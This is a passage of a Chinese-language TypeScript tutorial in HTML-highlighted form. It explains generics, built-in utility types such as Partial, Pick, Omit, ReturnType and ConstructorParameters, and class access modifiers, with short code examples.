arg;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 设置默认泛型值</span></span><br><span class="line"><span class="keyword">function</span> func&lt;T = <span class="built_in">string</span>&gt;(<span class="attr">obj</span>: T) &#123;&#125;</span><br><span class="line"><span class="keyword">function</span> func&lt;T = <span class="title class_">User</span> &amp; &#123; <span class="attr">name</span>: <span class="built_in">string</span> &#125;&gt;(<span class="attr">obj</span>: T) &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 在 .tsx 文件里，泛型可能会被当做 jsx 标签，可加extends</span></span><br><span class="line"><span class="keyword">const</span> toArray = &lt;T <span class="keyword">extends</span> &#123;&#125;&gt;<span class="function">(<span class="params">element: T</span>) =&gt;</span> [element]; <span class="comment">// No errors.</span></span><br></pre></td></tr></table></figure>

<h3 id="多个类型参数"><a href="#多个类型参数" class="headerlink" title="多个类型参数"></a>多个类型参数</h3><p>定义泛型的时候，可以一次定义多个类型参数：</p>
<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> swap&lt;T, U&gt;(<span class="attr">tuple</span>: [T, U]): [U, T] &#123;</span><br><span class="line">  <span class="keyword">return</span> [tuple[<span class="number">1</span>], tuple[<span class="number">0</span>]];</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">swap</span>([<span class="number">7</span>, <span class="string">&quot;seven&quot;</span>]); <span class="comment">// [&#x27;seven&#x27;, 7]</span></span><br></pre></td></tr></table></figure>

<p>上例中，我们定义了一个 <code>swap</code> 函数，用来交换输入的元组。</p>
<h3 id="索引访问操作符"><a href="#索引访问操作符" class="headerlink" title="索引访问操作符"></a>索引访问操作符</h3><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> getProperty&lt;T, K <span class="keyword">extends</span> keyof T&gt;(<span class="attr">o</span>: T, <span class="attr">name</span>: K): T[K] &#123;</span><br><span class="line">  <span class="keyword">return</span> o[name]; <span class="comment">// o[name] is of type T[K]</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">getProperty</span>(&#123; <span class="attr">age</span>: <span class="number">18</span> &#125;, <span class="string">&quot;age&quot;</span>);</span><br><span class="line"><span class="comment">//K是T的key，T[K]是T的value</span></span><br></pre></td></tr></table></figure>

<h3 id="泛型约束"><a href="#泛型约束" class="headerlink" title="泛型约束"></a>泛型约束</h3><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">interface</span> <span class="title class_">Lengthwise</span> &#123;</span><br><span class="line">  <span class="attr">length</span>: <span class="built_in">number</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> loggingIdentity&lt;T <span class="keyword">extends</span> <span class="title class_">Lengthwise</span>&gt;(<span class="attr">arg</span>: T): T &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(arg.<span class="property">length</span>);</span><br><span class="line">  <span class="keyword">return</span> arg;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="工具泛型"><a href="#工具泛型" class="headerlink" title="工具泛型"></a>工具泛型</h2><h3 id="Partial-amp-Pick"><a href="#Partial-amp-Pick" class="headerlink" title="Partial &amp; Pick"></a>Partial &amp; Pick</h3><p>**将所有属性变成可选属性 **</p>
<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//源码</span></span><br><span class="line"><span class="keyword">type</span> <span class="title class_">Partial</span>&lt;T&gt; = &#123;</span><br><span class="line">  [P <span class="keyword">in</span> keyof T]?: T[P];</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">type</span> <span class="title class_">Pick</span>&lt;T, K <span class="keyword">extends</span> keyof T&gt; = &#123;</span><br><span class="line">  [P <span class="keyword">in</span> K]: T[P];</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">User</span> &#123;</span><br><span class="line">  <span class="attr">id</span>: <span class="built_in">number</span>;</span><br><span class="line">  <span class="attr">age</span>: <span class="built_in">number</span>;</span><br><span class="line">  <span class="attr">name</span>: <span class="built_in">string</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 相当于: type PartialUser = &#123; id?: number; age?: number; name?: string; &#125;</span></span><br><span class="line"><span class="keyword">type</span> <span class="title class_">PartialUser</span> = <span class="title class_">Partial</span>&lt;<span class="title class_">User</span>&gt;;</span><br><span class="line"><span class="comment">// 相当于: type PickUser = &#123; id: number; age: number; &#125;</span></span><br><span class="line"><span class="keyword">type</span> <span class="title class_">PickUser</span> = <span class="title class_">Pick</span>&lt;<span class="title class_">User</span>, <span class="string">&quot;id&quot;</span> | <span class="string">&quot;age&quot;</span>&gt;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 扩展一下，将制定的key变成可选类型</span></span><br><span class="line"><span class="keyword">type</span> <span class="title class_">PartialOptional</span>&lt;T, K <span class="keyword">extends</span> keyof T&gt; = &#123;</span><br><span class="line">  [P <span class="keyword">in</span> K]?: T[P];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="Required"><a href="#Required" class="headerlink" title="Required"></a>Required</h3><p>Required 的作用是将传入的属性变为必选项, 源码如下</p>
<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> <span class="title class_">Required</span>&lt;T&gt; = &#123; [P <span class="keyword">in</span> keyof T]-?: T[P] &#125;;</span><br></pre></td></tr></table></figure>

<p><code>-?</code>将可选项代表的 <code>?</code> 去掉, 从而让这个类型变成必选项. 与之对应的还有个<code>+?</code> ,把属性变成可选项的.</p>
<h3 id="Mutable-未包含"><a href="#Mutable-未包含" class="headerlink" title="Mutable (未包含)"></a>Mutable (未包含)</h3><p>类似地, 其实还有对 <code>+</code> 和 <code>-</code>, 这里要说的不是变量的之间的进行加减而是对 <code>readonly</code> 进行加减.<br>以下代码的作用就是将 T 的所有属性的 readonly 移除,你也可以写一个相反的出来.</p>
<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> <span class="title class_">Mutable</span>&lt;T&gt; = &#123;</span><br><span class="line">  -<span class="keyword">readonly</span> [P <span class="keyword">in</span> keyof T]: T[P];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="Readonly"><a href="#Readonly" class="headerlink" title="Readonly"></a>Readonly</h3><p>将传入的属性变为只读选项</p>
<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> <span class="title class_">Readonly</span>&lt;T&gt; = &#123; <span class="keyword">readonly</span> [P <span class="keyword">in</span> keyof T]: T[P] &#125;;</span><br></pre></td></tr></table></figure>

<h3 id="DeepReadonly"><a href="#DeepReadonly" class="headerlink" title="DeepReadonly"></a>DeepReadonly</h3><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> <span class="title class_">DeepReadonly</span>&lt;T&gt; = &#123;</span><br><span class="line">  <span class="keyword">readonly</span> [P <span class="keyword">in</span> keyof T]: <span class="title class_">DeepReadonly</span>&lt;T[P]&gt;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="Record"><a href="#Record" class="headerlink" title="Record"></a>Record</h3><p>将 K 中所有的属性的值转化为 T 类型</p>
<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> <span class="title class_">Record</span>&lt;K <span class="keyword">extends</span> keyof <span class="built_in">any</span>, T&gt; = &#123; [P <span class="keyword">in</span> K]: T &#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> <span class="title class_">AnimalType</span> = <span class="string">&quot;cat&quot;</span> | <span class="string">&quot;dog&quot;</span> | <span class="string">&quot;frog&quot;</span>;</span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">AnimalDescription</span> &#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="built_in">string</span>;</span><br><span class="line">  <span class="attr">icon</span>: <span class="built_in">string</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> <span class="title class_">AnimalMap</span>: <span class="title class_">Record</span>&lt;<span class="title class_">AnimalType</span>, <span class="title class_">AnimalDescription</span>&gt; = &#123;</span><br><span class="line">  <span class="attr">cat</span>: &#123; <span class="attr">name</span>: <span class="string">&quot;猫&quot;</span>, <span class="attr">icon</span>: <span class="string">&quot; &quot;</span> &#125;,</span><br><span class="line">  <span class="attr">dog</span>: &#123; <span class="attr">name</span>: <span class="string">&quot;狗&quot;</span>, <span class="attr">icon</span>: <span class="string">&quot; &quot;</span> &#125;,</span><br><span class="line">  <span class="attr">forg</span>: &#123; <span class="attr">name</span>: <span class="string">&quot;蛙&quot;</span>, <span class="attr">icon</span>: <span class="string">&quot; &quot;</span> &#125;, <span class="comment">// 拼错</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="EEO"><a href="#EEO" class="headerlink" title="EEO"></a>EEO</h3><h4 id="Exclude-接受两个类型，去除-T-中的-U"><a href="#Exclude-接受两个类型，去除-T-中的-U" class="headerlink" title="Exclude 接受两个类型，去除 T 中的 U"></a>Exclude 接受两个类型，去除 T 中的 U</h4><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> <span class="title class_">Exclude</span>&lt;T, U&gt; = T <span class="keyword">extends</span> U ? <span class="built_in">never</span> : T;</span><br><span class="line"><span class="comment">// 相当于: type A = &#x27;a&#x27;</span></span><br><span class="line"><span class="keyword">type</span> A = <span class="title class_">Exclude</span>&lt;<span class="string">&#x27;x&#x27;</span> | <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;x&#x27;</span> | <span class="string">&#x27;y&#x27;</span> | <span class="string">&#x27;z&#x27;</span>&gt;</span><br><span class="line"><span class="title class_">Exclude</span>&lt;<span class="string">&#x27;age&#x27;</span>|<span class="string">&#x27;name&#x27;</span>,<span class="string">&#x27;age&#x27;</span>&gt; <span class="comment">// &#x27;name&#x27;</span></span><br></pre></td></tr></table></figure>

<h4 id="Extract-同样接受两个类型，提取-T-中的-U"><a href="#Extract-同样接受两个类型，提取-T-中的-U" class="headerlink" title="Extract 同样接受两个类型，提取 T 中的 U"></a>Extract 同样接受两个类型，提取 T 中的 U</h4><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Extract</span>&lt;<span class="string">&#x27;age&#x27;</span>|<span class="string">&#x27;name&#x27;</span>|<span class="string">&#x27;height&#x27;</span>,<span class="string">&#x27;age&#x27;</span>|<span class="string">&#x27;weight&#x27;</span>&gt; <span class="comment">// &#x27;age&#x27;</span></span><br></pre></td></tr></table></figure>

<h4 id="Omit"><a href="#Omit" class="headerlink" title="Omit"></a>Omit</h4><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> <span class="title class_">Omit</span>&lt;T, K <span class="keyword">extends</span> keyof <span class="built_in">any</span>&gt; = <span class="title class_">Pick</span>&lt;T, <span class="title class_">Exclude</span>&lt;keyof T, K&gt;&gt;;</span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">User</span> &#123;</span><br><span class="line">  <span class="attr">id</span>: <span class="built_in">number</span>;</span><br><span class="line">  <span class="attr">age</span>: <span class="built_in">number</span>;</span><br><span class="line">  <span class="attr">name</span>: <span class="built_in">string</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 相当于: type PickUser = &#123; age: number; name: string; &#125;</span></span><br><span class="line"><span class="keyword">type</span> <span class="title class_">OmitUser</span> = <span class="title class_">Omit</span>&lt;<span class="title class_">User</span>, <span class="string">&quot;id&quot;</span>&gt;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Omit + &amp; 重写属性</span></span><br><span class="line"><span class="keyword">type</span> <span class="title class_">Base</span> = &#123;</span><br><span class="line">  <span class="attr">foo</span>: <span class="built_in">number</span>;</span><br><span class="line">  <span class="attr">bar</span>: <span class="built_in">number</span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">type</span> B = <span class="title class_">Base</span> &amp; &#123;</span><br><span class="line">  <span class="attr">foo</span>: <span class="built_in">string</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="Parameters"><a href="#Parameters" class="headerlink" title="Parameters"></a>Parameters</h3><p>Parameters 获取函数的参数类型，将每个参数类型放在一个元组中。</p>
<ul>
<li>Parameters 首先约束参数 T 必须是个函数类型，所以(…args: any) =&gt; any&gt;替换成 Function 也是可以的</li>
<li>具体实现就是，判断 T 是否是函数类型，如果是则使用 inter P 让 ts 自己推导出函数的参数类型，并将推导的结果存到类型 P 上，否则就返回 never；</li>
</ul>
<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@desc</span> 具体实现</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">type</span> <span class="title class_">Parameters</span>&lt;T <span class="keyword">extends</span> (...<span class="attr">args</span>: <span class="built_in">any</span>) =&gt; <span class="built_in">any</span>&gt; = T <span class="keyword">extends</span> (</span><br><span class="line">  ...<span class="attr">args</span>: infer P</span><br><span class="line">) =&gt; <span class="built_in">any</span></span><br><span class="line">  ? P</span><br><span class="line">  : <span class="built_in">never</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@example</span></span></span><br><span class="line"><span class="comment"> * type Eg = [arg1: string, arg2: number];</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">type</span> <span class="title class_">Eg</span> = <span class="title class_">Parameters</span>&lt;<span class="function">(<span class="params">arg1: <span class="built_in">string</span>, arg2: <span class="built_in">number</span></span>) =&gt;</span> <span class="built_in">void</span>&gt;;</span><br></pre></td></tr></table></figure>

<h3 id="ReturnType"><a href="#ReturnType" class="headerlink" title="ReturnType"></a>ReturnType</h3><p>在阅读源码之前我们需要了解一下 <code>infer</code> 这个关键字, 在条件类型语句中, 我们可以用 <code>infer</code> 声明一个类型变量并且对它进行使用,<br>我们可以用它获取函数的返回类型， 源码如下</p>
<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> <span class="title class_">ReturnType</span>&lt;T&gt; = T <span class="keyword">extends</span> (...<span class="attr">args</span>: <span class="built_in">any</span>[]) =&gt; infer R ? R : <span class="built_in">any</span>;</span><br></pre></td></tr></table></figure>

<p>其实这里的 <code>infer R</code> 就是声明一个变量来承载传入函数签名的返回值类型, 简单说就是用它取到函数返回值的类型方便之后使用.<br>具体用法</p>
<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ReturnType 为内置工具类型，作用：由函数类型 T 的返回值类型构造一个类型。</span></span><br><span class="line"><span class="keyword">type</span> <span class="title class_">ReturnType</span>&lt;T&gt; = T <span class="keyword">extends</span> (...<span class="attr">args</span>: <span class="built_in">any</span>[]) =&gt; infer R ? R : <span class="built_in">any</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> func = <span class="function">() =&gt;</span> <span class="built_in">number</span>;</span><br><span class="line"><span class="keyword">type</span> variable = <span class="function">() =&gt;</span> <span class="built_in">string</span>;</span><br><span class="line"><span class="keyword">type</span> funcReturnType = <span class="title class_">ReturnType</span>&lt;func&gt;; <span class="comment">// funcReturnType 类型为 number</span></span><br><span class="line"><span class="keyword">type</span> varReturnType = <span class="title class_">ReturnType</span>&lt;variable&gt;; <span class="comment">// varReturnType 类型为 string</span></span><br></pre></td></tr></table></figure>

<p>​</p>
<p>infer 还可以用于解包，下面是一个解包数组里的元素类型的例子：</p>
<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> <span class="title class_">Ids</span> = <span class="built_in">number</span>[];</span><br><span class="line"><span class="keyword">type</span> <span class="title class_">Names</span> = <span class="built_in">string</span>[];</span><br><span class="line"><span class="keyword">type</span> <span class="title class_">Unpacked</span>&lt;T&gt; = T <span class="keyword">extends</span> (infer R)[] ? R : T;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> idType = <span class="title class_">Unpacked</span>&lt;<span class="title class_">Ids</span>&gt;; <span class="comment">// idType 类型为 number</span></span><br><span class="line"><span class="keyword">type</span> nameType = <span class="title class_">Unpacked</span>&lt;<span class="title class_">Names</span>&gt;; <span class="comment">// nameType 类型为string</span></span><br></pre></td></tr></table></figure>

<h3 id="ConstructorParameters"><a href="#ConstructorParameters" class="headerlink" title="ConstructorParameters"></a>ConstructorParameters</h3><p>ConstructorParameters 可以获取类的构造函数的参数类型，存在一个元组中。</p>
<ul>
<li>首先约束参数 T 为拥有构造函数的类。注意这里有个 abstract 修饰符，等下会说明。</li>
<li>实现时，判断 T 是满足约束的类时，利用 infer P 自动推导构造函数的参数类型，并最终返回该类型。</li>
</ul>
<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 核心实现还是利用infer进行推导构造函数的参数类型</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">type</span> <span class="title class_">ConstructorParameters</span>&lt;T <span class="keyword">extends</span> <span class="keyword">abstract</span> <span class="keyword">new</span> (...<span class="attr">args</span>: <span class="built_in">any</span>) =&gt; <span class="built_in">any</span>&gt; =</span><br><span class="line">  T <span class="keyword">extends</span> <span class="keyword">abstract</span> <span class="keyword">new</span> (...<span class="attr">args</span>: infer P) =&gt; <span class="built_in">any</span> ? P : <span class="built_in">never</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@example</span></span></span><br><span class="line"><span class="comment"> * type Eg = string;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">ErrorConstructor</span> &#123;</span><br><span class="line">  <span class="keyword">new</span> (message?: <span class="built_in">string</span>): <span class="title class_">Error</span>;</span><br><span class="line">  (message?: <span class="built_in">string</span>): <span class="title class_">Error</span>;</span><br><span class="line">  <span class="keyword">readonly</span> <span class="attr">prototype</span>: <span class="title class_">Error</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">type</span> <span class="title class_">Eg</span> = <span class="title class_">ConstructorParameters</span>&lt;<span class="title class_">ErrorConstructor</span>&gt;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@example</span></span></span><br><span class="line"><span class="comment"> * type Eg2 = [name: string, sex?: number];</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">People</span> &#123;</span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params"><span class="keyword">public</span> name: <span class="built_in">string</span>, sex?: <span class="built_in">number</span></span>) &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">type</span> <span class="title class_">Eg2</span> = <span class="title class_">ConstructorParameters</span>&lt;<span class="keyword">typeof</span> <span class="title class_">People</span>&gt;;</span><br></pre></td></tr></table></figure>

<h3 id="AxiosReturnType-未包含"><a href="#AxiosReturnType-未包含" class="headerlink" title="AxiosReturnType (未包含)"></a>AxiosReturnType (未包含)</h3><p>开发经常使用 axios 进行封装 API 层 请求, 通常是一个函数返回一个 <code>AxiosPromise&lt;Resp&gt;</code>, 现在我想取到它的 Resp 类型, 根据上一个工具泛型的知识我们可以这样写.</p>
<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">AxiosPromise</span> &#125; <span class="keyword">from</span> <span class="string">&quot;axios&quot;</span>; <span class="comment">// 导入接口</span></span><br><span class="line"><span class="keyword">type</span> <span class="title class_">AxiosReturnType</span>&lt;T&gt; = T <span class="keyword">extends</span> (...<span class="attr">args</span>: <span class="built_in">any</span>[]) =&gt; <span class="title class_">AxiosPromise</span>&lt;infer R&gt;</span><br><span class="line">  ? R</span><br><span class="line">  : <span class="built_in">any</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用</span></span><br><span class="line"><span class="keyword">type</span> <span class="title class_">Resp</span> = <span class="title class_">AxiosReturnType</span>&lt;<span class="title class_">Api</span>&gt;; <span class="comment">// 泛型参数中传入你的 Api 请求函数</span></span><br></pre></td></tr></table></figure>

<h2 id="类"><a href="#类" class="headerlink" title="类"></a>类</h2><h3 id="公有私有"><a href="#公有私有" class="headerlink" title="公有私有"></a>公有私有</h3><p>TypeScript 里，成员都默认为<code>public</code>。当成员被标记成<code>private</code>时，它就不能在声明它的类的外部访问。<br>TypeScript 使用的是结构性类型系统。 当我们比较两种不同的类型时，并不在乎它们从何处而来，如果所有成员的类型都是兼容的，我们就认为它们的类型是兼容的。<br>然而，当我们比较带有<code>private</code>或<code>protected</code>成员的类型的时候，情况就不同了。 如果其中一个类型里包含一个<code>private</code>成员，那么只有当另外一个类型中也存在这样一个<code>private</code>成员， 并且它们都是来自同一处声明时，我们才认为这两个类型是兼容的。 对于<code>protected</code>成员也使用这个规则。</p>
<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Animal</span> &#123;</span><br><span class="line">  <span class="keyword">private</span> <span class="attr">name</span>: <span class="built_in">string</span>;</span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">theName: <span class="built_in">string</span></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">name</span> = theName;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">Animal</span>(<span class="string">&quot;Cat&quot;</span>).<span class="property">name</span>; <span class="comment">// 错误: &#x27;name&#x27; 是私有的.</span></span><br></pre></td></tr></table></figure>

<h3 id="受保护"><a href="#受保护" class="headerlink" title="受保护"></a>受保护</h3><p>protected<code>修饰符与</code>private<code>修饰符的行为很相似，但有一点不同，</code>protected`成员在派生类中仍然可以访问</p>
<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">  <span class="keyword">protected</span> <span class="attr">name</span>: <span class="built_in">string</span>;</span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">name: <span class="built_in">string</span></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">name</span> = name;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Employee</span> <span class="keyword">extends</span> <span class="title class_ inherited__">Person</span> &#123;</span><br><span class="line">  <span class="keyword">private</span> <span class="attr">department</span>: <span class="built_in">string</span>;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">name: <span class="built_in">string</span>, department: <span class="built_in">string</span></span>) &#123;</span><br><span class="line">    <span class="variable language_">super</span>(name);</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">department</span> = department;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="title function_">getElevatorPitch</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">`Hello, my name is <span class="subst">$&#123;<span class="variable language_">this</span>.name&#125;</span> and I work in <span class="subst">$&#123;<span class="variable language_">this</span>.department&#125;</span>.`</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> howard = <span class="keyword">new</span> <span class="title class_">Employee</span>(<span class="string">&quot;Howard&quot;</span>, <span class="string">&quot;Sales&quot;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(howard.<span class="title function_">getElevatorPitch</span>());</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(howard.<span class="property">name</span>); <span class="comment">// 错误</span></span><br></pre></td></tr></table></figure>

<h3 id="只读"><a href="#只读" class="headerlink" title="只读"></a>只读</h3><p>readonly，你可以使用<code>readonly</code>关键字将属性设置为只读的。 只读属性必须在声明时或构造函数里被初始化。<br>​</p>
<h3 id="静态属性"><a href="#静态属性" class="headerlink" title="静态属性"></a>静态属性</h3><p>static 静态属性存在于类本身上面而不是类的实例上。<br>​</p>
<h3 id="抽象类"><a href="#抽象类" class="headerlink" title="抽象类"></a>抽象类</h3><p>抽象类（abstract）做为其它派生类的基类使用。 它们一般不会直接被实例化。 不同于接口，抽象类可以包含成员的实现细节。</p>
<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">Department</span> &#123;</span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params"><span class="keyword">public</span> name: <span class="built_in">string</span></span>) &#123;&#125;</span><br><span class="line">  <span class="title function_">printName</span>(): <span class="built_in">void</span> 